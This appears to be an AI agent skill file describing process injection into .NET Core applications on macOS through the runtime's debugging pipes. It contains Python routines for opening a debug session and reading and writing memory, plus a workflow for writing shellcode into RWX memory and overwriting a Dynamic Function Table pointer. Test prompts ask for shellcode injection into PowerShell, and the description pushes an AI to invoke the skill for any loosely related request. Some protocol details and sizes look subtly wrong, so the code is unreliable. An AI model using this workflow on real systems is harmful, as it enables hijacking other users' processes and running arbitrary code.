---
name: macos-dotnet-injection
description: How to inject code into .NET applications on macOS using the debugging protocol. Use this skill whenever the user mentions .NET debugging, macOS injection, named pipes, DFT exploitation, or wants to interact with .NET Core processes on macOS. This skill covers establishing debugging sessions, reading/writing memory, and code execution via the Dynamic Function Table. Make sure to use this skill for any macOS .NET security research, penetration testing, or debugging protocol analysis tasks.
---

# macOS .NET Application Injection

This skill enables code injection into .NET applications on macOS by exploiting the .NET debugging protocol. The .NET runtime creates named pipes for debugger communication that can be leveraged for memory manipulation and code execution.

## Overview

.NET Core processes on macOS create two named pipes in `$TMPDIR` for debugging:
- **`-in` pipe**: For receiving debugger commands
- **`-out` pipe**: For sending responses

By establishing a debugging session through these pipes, you can read/write memory and execute arbitrary code.

## Finding .NET Debugging Pipes

### Step 1: Locate the pipes

```bash
# Find .NET debugging FIFOs in the user's temp directory
ls -la $TMPDIR | grep -E '\.net|dbg'

# Or search more broadly
find $TMPDIR -type p -name '*-in' -o -name '*-out' 2>/dev/null
```

### Step 2: Identify target process

```bash
# Find .NET processes
ps aux | grep -E 'dotnet|mono|pwsh'

# Get process ID for vmmap analysis
ps -eo pid,comm | grep -i dotnet
```

## Establishing a Debugging Session

### Message Header Structure

The debugging protocol uses a `MessageHeader` struct:

```c
struct MessageHeader {
    MessageType   m_eType;        // Message type
    DWORD         m_cbDataBlock;  // Size of following data block
    DWORD         m_dwId;         // Message ID from sender
    DWORD         m_dwReplyId;    // Reply-to Message ID
    DWORD         m_dwLastSeenId; // Last seen Message ID by sender
    DWORD         m_dwReserved;   // Reserved (initialize to zero)
    union {
        struct {
            DWORD m_dwMajorVersion;   // Protocol version
            DWORD m_dwMinorVersion;
        } VersionInfo;
    } TypeSpecificData;
    BYTE          m_sMustBeZero[8];
}
```

### Session Request

To establish a debugging session:

1. **Set message type to `MT_SessionRequest`**
2. **Configure protocol version** (major: 2, minor: 0)
3. **Send header via `write` syscall**
4. **Send `SessionRequestData` with GUID**
5. **Read response from `out` pipe**

```python
# Example Python implementation
def establish_debug_session(pipe_path):
    import struct
    
    # Message types
    MT_SessionRequest = 0x00000001
    
    # Protocol version
    MAJOR_VERSION = 2
    MINOR_VERSION = 0
    
    # Build MessageHeader
    header = struct.pack('<IIIIII',
        MT_SessionRequest,      # m_eType
        16,                     # m_cbDataBlock (SessionRequestData size)
        1,                      # m_dwId
        0,                      # m_dwReplyId
        0,                      # m_dwLastSeenId
        0                       # m_dwReserved
    )
    
    # Version info
    version_data = struct.pack('<II', MAJOR_VERSION, MINOR_VERSION)
    header += version_data
    header += b'\x00' * 8  # m_sMustBeZero
    
    # Session GUID (16 bytes)
    session_guid = b'\x09' * 16
    
    # Write to pipe
    with open(pipe_path, 'wb') as f:
        f.write(header)
        f.write(session_guid)
    
    # Read response
    with open(pipe_path.replace('-in', '-out'), 'rb') as f:
        response = f.read(48)  # MessageHeader size
    
    return response
```

## Reading Memory

### MT_ReadMemory Message

Once a session is established, use `MT_ReadMemory` to read process memory:

```python
def read_memory(pipe_in, pipe_out, address, length):
    import struct
    
    MT_ReadMemory = 0x00000002
    
    # Build read request header
    header = struct.pack('<IIIIII',
        MT_ReadMemory,
        12,  # Data block size (address + length)
        2,   # Message ID
        0,
        1,
        0
    )
    
    # Address and length
    data_block = struct.pack('<QQ', address, length)
    
    # Send request
    with open(pipe_in, 'wb') as f:
        f.write(header)
        f.write(data_block)
    
    # Read response
    with open(pipe_out, 'rb') as f:
        response_header = f.read(48)
        memory_data = f.read(length)
    
    return memory_data
```

## Writing Memory

### MT_WriteMemory Message

To write to process memory:

```python
def write_memory(pipe_in, pipe_out, address, data):
    import struct
    
    MT_WriteMemory = 0x00000003
    length = len(data)
    
    # Build write request header
    header = struct.pack('<IIIIII',
        MT_WriteMemory,
        12 + length,  # Data block size
        3,            # Message ID
        0,
        2,
        0
    )
    
    # Address and length
    data_block = struct.pack('<QQ', address, length)
    
    # Send request with data
    with open(pipe_in, 'wb') as f:
        f.write(header)
        f.write(data_block)
        f.write(data)
    
    # Read confirmation
    with open(pipe_out, 'rb') as f:
        response = f.read(48)
    
    return True
```

## Code Execution via Dynamic Function Table (DFT)

### Finding RWX Memory Regions

```bash
# Use vmmap to find executable memory regions
vmmap -pages [PID] | grep "rwx"

# Example
vmmap -pages 35829 | grep "rwx/rwx"
```

### Locating the DFT

The Dynamic Function Table is used by the .NET runtime for JIT compilation helpers:

1. **Get `libcorclr.dll` base address** via `MT_GetDCB` message
2. **Search for `_hlpDynamicFuncTable` symbol** in the library
3. **Overwrite a function pointer** with shellcode address

```python
def get_dcb(pipe_in, pipe_out):
    """Get Debug Control Block - contains libcorclr.dll address"""
    import struct
    
    MT_GetDCB = 0x00000004
    
    header = struct.pack('<IIIIII',
        MT_GetDCB,
        0,  # No data block
        4,
        0,
        3,
        0
    )
    
    with open(pipe_in, 'wb') as f:
        f.write(header)
    
    with open(pipe_out, 'rb') as f:
        response = f.read(48)
        dcb_data = f.read(1024)  # DCB structure
    
    # Parse m_helperRemoteStartAddr from DCB
    # This gives the base address of libcorclr.dll
    return dcb_data
```

### Signature Hunting for DFT

```bash
# Find _hlpDynamicFuncTable in libcorclr.dll
# For x64 systems, search for the symbol reference

# Example using otool
otool -tV /usr/lib/dotnet/shared/Microsoft.NETCore.App/*/libcoreclr.dylib | grep -i dynamic

# Or use strings and grep
strings /usr/lib/dotnet/shared/Microsoft.NETCore.App/*/libcoreclr.dylib | grep -i "DynamicFunc"
```

## Complete Workflow

### 1. Reconnaissance

```bash
# Find target .NET process
ps aux | grep -E 'dotnet|pwsh'

# Locate debugging pipes
ls -la $TMPDIR | grep -E '\.net.*-in'

# Analyze memory layout
vmmap -pages [PID] | grep "rwx"
```

### 2. Establish Session

```bash
# Use the pipe paths found
PIPE_IN="$TMPDIR/dotnet_debug_XXXX-in"
PIPE_OUT="$TMPDIR/dotnet_debug_XXXX-out"

# Run session establishment script
python3 establish_session.py "$PIPE_IN" "$PIPE_OUT"
```

### 3. Memory Operations

```bash
# Read memory at specific address
python3 read_memory.py "$PIPE_IN" "$PIPE_OUT" 0x7fff5fbff000 256

# Write shellcode to RWX region
python3 write_memory.py "$PIPE_IN" "$PIPE_OUT" 0x7fff5fbff000 shellcode.bin
```

### 4. Code Execution

```bash
# Get DCB to find libcorclr.dll base
python3 get_dcb.py "$PIPE_IN" "$PIPE_OUT"

# Locate DFT and overwrite function pointer
python3 inject_dft.py "$PIPE_IN" "$PIPE_OUT" [SHELLCODE_ADDRESS]
```

## Test Cases

### Test 1: Basic Session Establishment

**Prompt**: "I need to establish a debugging session with a .NET process on macOS. The pipe is at /tmp/dotnet_debug_12345-in"

**Expected**: Script to establish session with proper MessageHeader

### Test 2: Memory Read

**Prompt**: "Read 256 bytes from address 0x7fff5fbff000 in a .NET process"

**Expected**: MT_ReadMemory implementation with correct header

### Test 3: Code Injection

**Prompt**: "Inject shellcode into a PowerShell process running .NET Core on macOS"

**Expected**: Full workflow including DFT location and function pointer overwrite

## Security Considerations

- **Permissions**: Requires access to the target process's temp directory
- **Process ownership**: Works best on processes owned by the same user
- **System Integrity Protection**: May block certain operations on modern macOS
- **Detection**: Named pipe access may be logged by EDR solutions

## References

- [Original Research](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [.NET Runtime Source](https://github.com/dotnet/runtime)
- [dbgtransportsession.cpp](https://github.com/dotnet/runtime/blob/main/src/coreclr/debug/shared/dbgtransportsession.cpp)
- [twowaypipe.cpp](https://github.com/dotnet/runtime/blob/main/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp)
- [jithelpers.h](https://github.com/dotnet/runtime/blob/main/src/coreclr/src/inc/jithelpers.h)

## Scripts

See the `scripts/` directory for:
- `find_dotnet_pipes.sh` - Locate .NET debugging pipes
- `establish_session.py` - Establish debugging session
- `read_memory.py` - Read process memory
- `write_memory.py` - Write to process memory
- `get_dcb.py` - Get Debug Control Block
- `inject_dft.py` - Inject via Dynamic Function Table
